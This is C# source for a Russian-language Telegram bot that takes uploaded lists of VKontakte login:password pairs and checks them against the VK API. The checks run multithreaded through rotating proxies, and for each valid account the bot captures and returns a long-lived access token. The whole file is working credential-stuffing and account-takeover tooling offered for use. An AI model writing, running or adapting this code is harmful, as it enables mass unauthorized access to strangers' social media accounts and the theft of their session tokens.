using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.IO;
using Telegram.Bot;
using Telegram.Bot.Types.ReplyMarkups;
using Telegram.Bot.Types.Enums;
using System.Threading;
using Microsoft.Extensions.DependencyInjection;
using VkNet.Exception;
using VkNet;
using System.Net;
using VkNet.Model;
using VkNet.Enums.Filters;

namespace TokenBot
{
    class Program
    {
        public static Dictionary<long, int> action_data = new Dictionary<long, int>();
        public static Dictionary<long, int> proxy_data = new Dictionary<long, int>();
        public static Dictionary<long, List<string>> result_data = new Dictionary<long, List<string>>();

        public static BackgroundWorker bw;
        public static TelegramBotClient Bot = new TelegramBotClient("");
        public static string token = "";
        public static void Main(string[] args)
        {
            if (!Directory.Exists("Users"))
                Directory.CreateDirectory("Users");

            bw = new BackgroundWorker();
            bw.DoWork += bw_DoWork;

            bw.RunWorkerAsync(token);
            Console.WriteLine("Запуск...");
            Console.ReadLine();
        }
        async public static void bw_DoWork(object sender, DoWorkEventArgs e)
        {
            var worker = sender as BackgroundWorker;
            var key = e.Argument as String;
            try
            {
                await Bot.SetWebhookAsync("");

                Bot.OnMessage += async (object su, Telegram.Bot.Args.MessageEventArgs evu) =>
                {
                    var message = evu.Message;
                    if (message == null) return;

                    try
                    {
                        if (message.Type == MessageType.Text)
                        {
                            if (message.Text == "/start" || message.Text == "Отмена")
                            {
                                if (!Directory.Exists($@"Users\{message.Chat.Id}"))
                                    Directory.CreateDirectory($@"Users\{message.Chat.Id}");
                                if (!File.Exists($@"Users\{message.Chat.Id}\settings.txt"))
                                {
                                    var file = File.CreateText($@"Users\{message.Chat.Id}\settings.txt");
                                    file.WriteLine("off,on");
                                    file.Close();
                                }
                                if (!File.Exists($@"Users\{message.Chat.Id}\proxies.txt"))
                                    File.Create($@"Users\{message.Chat.Id}\proxies.txt").Close();

                                ReplyKeyboardMarkup keyboard = new ReplyKeyboardMarkup();
                                keyboard.Keyboard = new KeyboardButton[][]
                                {
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Новое задание"),
                                    },
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Настройки")
                                    }
                                };
                                await Bot.SendTextMessageAsync(message.Chat.Id, "Добро пожаловать в меню бота получения токенов аккаунтов ВКонтакте.\nСоздатель бота - @Irval1337", ParseMode.Default, false, false, 0, keyboard);
                            }
                            else if (message.Text == "Новое задание")
                            {
                                ReplyKeyboardMarkup keyboard = new ReplyKeyboardMarkup();
                                keyboard.Keyboard = new KeyboardButton[][]
                                {
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Отмена"),
                                    }
                                };
                                if (!action_data.ContainsKey(message.Chat.Id))
                                    action_data.Add(message.Chat.Id, 1);
                                if (action_data[message.Chat.Id] != 2)
                                {
                                    action_data[message.Chat.Id] = 1;
                                    await Bot.SendTextMessageAsync(message.Chat.Id, "Отправьте в текущий чат базу аккаунтов форматом log:pass", ParseMode.Default, false, false, 0, keyboard);
                                }
                                else
                                    await Bot.SendTextMessageAsync(message.Chat.Id, "Дождитесь завершения предыдушей проверки или завершите ее");
                            }
                            else if (message.Text == "Настройки" || message.Text == "Назад")
                            {
                                string[] settings_data = File.ReadAllText($@"Users\{message.Chat.Id}\settings.txt").Split(',');
                                ReplyKeyboardMarkup keyboard = new ReplyKeyboardMarkup();
                                keyboard.Keyboard = new KeyboardButton[][]
                                {
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Многопоточность: " + (settings_data[0] == "off" ? "ВЫКЛ" : settings_data[0] + " потоков")),
                                        new KeyboardButton("Использовать прокси: " + (settings_data[1] == "on" ? "ВКЛ" : "ВЫКЛ")),
                                    },
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("База прокси")
                                    },
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Отмена")
                                    }
                                };
                                await Bot.SendTextMessageAsync(message.Chat.Id, "Нажмите на кнопку настройки, чтобы изменить значение", ParseMode.Default, false, false, 0, keyboard);
                            }
                            else if (message.Text.StartsWith("Многопоточность: "))
                            {
                                int new_value = 0;
                                if (message.Text == "Многопоточность: ВЫКЛ")
                                    new_value = 3;
                                else if (message.Text == "Многопоточность: 3 потоков")
                                    new_value = 5;
                                else if (message.Text == "Многопоточность: 5 потоков")
                                    new_value = 10;
                                else if (message.Text == "Многопоточность: 10 потоков")
                                    new_value = 25;
                                else if (message.Text == "Многопоточность: 25 потоков")
                                    new_value = 50;
                                else if (message.Text == "Многопоточность: 50 потоков")
                                    new_value = 0;

                                string[] settings_data = File.ReadAllText($@"Users\{message.Chat.Id}\settings.txt").Split(',');
                                settings_data[0] = new_value == 0 ? "off" : new_value.ToString();
                                File.WriteAllText($@"Users\{message.Chat.Id}\settings.txt", string.Join(",", settings_data));

                                ReplyKeyboardMarkup keyboard = new ReplyKeyboardMarkup();
                                keyboard.Keyboard = new KeyboardButton[][]
                                {
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Многопоточность: " + (settings_data[0] == "off" ? "ВЫКЛ" : settings_data[0] + " потоков")),
                                        new KeyboardButton("Использовать прокси: " + (settings_data[1] == "on" ? "ВКЛ" : "ВЫКЛ")),
                                    },
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("База прокси")
                                    },
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Отмена")
                                    }
                                };
                                await Bot.SendTextMessageAsync(message.Chat.Id, "Нажмите на кнопку настройки, чтобы изменить значение", ParseMode.Default, false, false, 0, keyboard);
                            }
                            else if (message.Text.StartsWith("Использовать прокси: "))
                            {
                                string new_value = "off";
                                if (message.Text == "Использовать прокси: ВКЛ")
                                    new_value = "off";
                                else if (message.Text == "Использовать прокси: ВЫКЛ")
                                    new_value = "on";

                                string[] settings_data = File.ReadAllText($@"Users\{message.Chat.Id}\settings.txt").Split(',');
                                settings_data[1] = new_value;
                                File.WriteAllText($@"Users\{message.Chat.Id}\settings.txt", string.Join(",", settings_data));

                                ReplyKeyboardMarkup keyboard = new ReplyKeyboardMarkup();
                                keyboard.Keyboard = new KeyboardButton[][]
                                {
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Многопоточность: " + (settings_data[0] == "off" ? "ВЫКЛ" : settings_data[0] + " потоков")),
                                        new KeyboardButton("Использовать прокси: " + (settings_data[1] == "on" ? "ВКЛ" : "ВЫКЛ")),
                                    },
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("База прокси")
                                    },
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Отмена")
                                    }
                                };
                                await Bot.SendTextMessageAsync(message.Chat.Id, "Нажмите на кнопку настройки, чтобы изменить значение", ParseMode.Default, false, false, 0, keyboard);
                            }
                            else if (message.Text == "База прокси")
                            {
                                ReplyKeyboardMarkup keyboard = new ReplyKeyboardMarkup();
                                keyboard.Keyboard = new KeyboardButton[][]
                                {
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Изменить")
                                    },
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Назад")
                                    },
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Отмена")
                                    }
                                };

                                await Bot.SendTextMessageAsync(message.Chat.Id, "В настоящий момент используется следующая база прокси:");
                                if (File.ReadAllLines($@"Users\{message.Chat.Id}\proxies.txt").Length > 0)
                                    await Bot.SendDocumentAsync(message.Chat.Id, new Telegram.Bot.Types.InputFiles.InputOnlineFile(File.OpenRead($@"Users\{message.Chat.Id}\proxies.txt")), null, ParseMode.Default, false, 0, keyboard);
                                else
                                    await Bot.SendTextMessageAsync(message.Chat.Id, "Пусто", ParseMode.Default, false, false, 0, keyboard);
                            }
                            else if (message.Text == "Изменить")
                            {
                                if (!action_data.ContainsKey(message.Chat.Id))
                                    action_data.Add(message.Chat.Id, 0);
                                else if (action_data[message.Chat.Id] != 2)
                                {
                                    action_data[message.Chat.Id] = 0;
                                    await Bot.SendTextMessageAsync(message.Chat.Id, "Отправьте в текущий чат базу прокси формата ip:port");
                                }
                                else
                                    await Bot.SendTextMessageAsync(message.Chat.Id, "Дождитесь завершения предыдушей проверки или завершите ее");
                            }
                            else if (message.Text == "Остановить")
                            {
                                ReplyKeyboardMarkup keyboard = new ReplyKeyboardMarkup();
                                keyboard.Keyboard = new KeyboardButton[][]
                                {
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Новое задание"),
                                    },
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Настройки")
                                    }
                                };
                                action_data[message.Chat.Id] = -1;
                                await Bot.SendTextMessageAsync(message.Chat.Id, "Процесс проверки успешно остановлен!", ParseMode.Default, false, false, 0, keyboard);
                            }
                            else
                                await Bot.SendTextMessageAsync(message.Chat.Id, "Неизвестная команда");
                        }
                        else if (message.Type == MessageType.Document)
                        {
                            if (action_data.ContainsKey(message.Chat.Id) && action_data[message.Chat.Id] != 2)
                            {
                                string msg = message.Caption;
                                var id = await Bot.GetFileAsync(message.Document.FileId);
                                if (action_data[message.Chat.Id] == 1)
                                {
                                    using (FileStream fs = new FileStream("Users\\" + message.Chat.Id + "\\base.txt", FileMode.Create))
                                    {
                                        await Bot.DownloadFileAsync(id.FilePath, fs);
                                        fs.Close();
                                        fs.Dispose();
                                    }
                                    new Thread(startChecking).Start(message.Chat.Id);
                                }
                                else
                                {
                                    using (FileStream fs = new FileStream("Users\\" + message.Chat.Id + "\\proxies.txt", FileMode.Create))
                                    {
                                        await Bot.DownloadFileAsync(id.FilePath, fs);
                                        fs.Close();
                                        fs.Dispose();
                                    }
                                    action_data.Remove(message.Chat.Id);
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessageAsync(message.Chat.Id, "Во время работы бота возникла ошибка: " + ex.Message);
                    }
                };

                Bot.StartReceiving();
            }
            catch (Telegram.Bot.Exceptions.ApiRequestException ex)
            {
                Console.WriteLine(ex.Message);
            }

        }

        public static void startChecking(object data)
        {
            long chatId = (long)data;
            ReplyKeyboardMarkup keyboard = new ReplyKeyboardMarkup();
            keyboard.Keyboard = new KeyboardButton[][]
            {
                new KeyboardButton[]
                {
                    new KeyboardButton("Остановить")
                }
            };
            Bot.SendTextMessageAsync(chatId, "Проверка успешно начата!", ParseMode.Default, false, false, 0, keyboard);
            string[] settings = File.ReadAllText("Users\\" + chatId.ToString() + "\\settings.txt").Split(',');
            string[] database = File.ReadAllLines("Users\\" + chatId.ToString() + "\\base.txt");

            if (settings[1] == "on")
                proxy_data.Add(chatId, 0);

            result_data.Add(chatId, new List<string>());

            if (settings[0] != "off")
            {
                int count = database.Length / Convert.ToInt32(settings[0]);
                for (int i = 0; i < Convert.ToInt32(settings[0]); i++)
                {
                    var checker = new Thread(Checker);
                    List<string> args = new List<string>();
                    if (i != Convert.ToInt32(settings[0]) - 1)
                        args = database.Skip(i * count).Take(count).ToList();
                    else
                        args = database.Skip(i * count).ToList();

                    args.Add(chatId.ToString());

                    if (i == Convert.ToInt32(settings[0]) - 1)
                        args.Add("LAST");
                    checker.Start(args);
                }
            }
            else
            {
                var args = database.ToList();
                args.Add(chatId.ToString());
                args.Add("LAST");
                new Thread(Checker).Start(args);
            }

            action_data[chatId] = 2;
        }

        public static void Checker(object accs)
        {
            List<string> database = (List<string>)accs;
            int index;
            if (database[database.Count - 1] != "LAST")
                index = 1;
            else
                index = 2;
            bool isLast = index == 2;
            long chatId = Convert.ToInt64(database[database.Count - index]);
            for (int i = index; i > 0; i--)
                database.RemoveAt(database.Count - i);
           
            string[] Proxies = File.ReadAllLines("Users\\" + chatId.ToString() + "\\proxies.txt");

            for (int i = 0; i < database.Count && action_data.ContainsKey(chatId) && action_data[chatId] != -1; i++)
            {
                try
                {
                    var serviceCollection = new ServiceCollection();
                    if (proxy_data.ContainsKey(chatId) && Proxies.Length > proxy_data[chatId])
                        serviceCollection.AddSingleton<IWebProxy>(new WebProxy(Proxies[proxy_data[chatId]]));

                    VkApi vkapi = new VkApi(serviceCollection);
                    var data = database[i].Split(':');
                    vkapi.Authorize(new ApiAuthParams()
                    {
                        Login = data[0],
                        Password = data[1],
                        ApplicationId = 2685278,
                        Settings = Settings.Offline
                    });
                    result_data[chatId].Add(database[i] + ":" + vkapi.Token);

                }
                catch (VkAuthorizationException)
                {
                    
                }
                catch
                {
                    if (proxy_data.ContainsKey(chatId))
                    {
                        i--;
                        proxy_data[chatId]++;
                    }
                }
            }

            if (isLast)
            {
                action_data.Remove(chatId);
                proxy_data.Remove(chatId);
                File.Create("Users\\" + chatId.ToString() + "\\lastchecking.txt").Close();
                File.WriteAllLines("Users\\" + chatId.ToString() + "\\lastchecking.txt", result_data[chatId]);

                ReplyKeyboardMarkup keyboard = new ReplyKeyboardMarkup();
                keyboard.Keyboard = new KeyboardButton[][]
                {
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Новое задание"),
                                    },
                                    new KeyboardButton[]
                                    {
                                        new KeyboardButton("Настройки")
                                    }
                };

                if (result_data[chatId].Count > 0) {
                    Bot.SendTextMessageAsync(chatId, "Полученные за время проверки токены:");
                    Bot.SendDocumentAsync(chatId, new Telegram.Bot.Types.InputFiles.InputOnlineFile(File.OpenRead("Users\\" + chatId.ToString() + "\\lastchecking.txt")), null, ParseMode.Default, false, 0, keyboard);
                }
                else
                {
                    Bot.SendTextMessageAsync(chatId, "Аккаунты базы невалидны", ParseMode.Default, false, false, 0, keyboard);
                }
                result_data.Remove(chatId);
            }
        }
    }
}
